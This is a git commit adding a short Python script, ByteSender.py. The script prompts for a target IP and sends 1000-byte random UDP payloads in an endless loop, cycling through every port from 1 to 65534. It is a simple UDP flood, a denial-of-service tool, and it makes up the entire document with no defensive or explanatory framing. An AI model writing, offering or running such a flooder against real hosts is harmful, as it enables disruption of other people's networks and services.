d60bf6e15d4e1df289725e0987a1704b7445c26d
cardstdani <72665778+cardstdani@users.noreply.github.com>
2021-07-30 18:24:56 +0200

    Create ByteSender.py

---
+++ ByteSender.py
@@ -0,0 +1,17 @@
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1000)
+
+ip = input("Enter IP: ")
+port = 1
+
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
+    if port == 65534:
+        port = 1
